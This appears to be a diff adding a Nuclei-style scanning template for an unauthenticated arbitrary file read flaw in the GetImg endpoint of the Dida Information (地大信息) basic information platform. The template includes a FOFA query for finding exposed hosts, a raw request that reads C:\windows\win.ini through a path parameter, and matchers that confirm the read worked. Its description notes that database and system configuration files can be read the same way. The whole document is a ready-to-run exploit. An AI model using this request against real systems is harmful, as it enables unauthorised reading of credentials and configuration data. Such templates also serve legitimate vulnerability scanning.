@@ -1,0 +1,34 @@
+id: didaxinxi-GetImg-File-reading
+
+info:
+  tags: didaxinxi-GetImg-File-reading
+  name: 地大信息-基础信息平台 GetImg 任意文件读取漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="/SystemManage/BaseProject" || title=="基础信息平台"
+    地大信息-基础信息平台 GetImg 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+
+
+
+http:
+  - raw:
+      - |
+        GET /SystemManage/BaseProject/GetImg?path=C:\windows\win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
